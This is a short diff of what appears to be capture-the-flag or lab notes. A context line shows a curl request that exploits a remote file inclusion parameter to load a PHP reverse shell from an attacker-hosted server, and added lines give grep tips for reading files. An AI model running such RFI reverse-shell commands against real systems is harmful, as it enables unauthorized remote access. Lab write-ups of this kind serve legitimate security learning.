@@ -81,6 +81,13 @@ But if you use curl you can connect the reverse shell
 curl http://10.10.56.103/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.52.17/php-reverse-shell.php
 
 Don't forget to host your python server to do RFI attack.
+______________________________________________________________________________________________________________________________
+
+Instead of using cat, to use less, grep.
+
+#grep . robots.txt ( .(dot) is current directory)
+#grep -r . (read every files recursively)
+
 
 
 
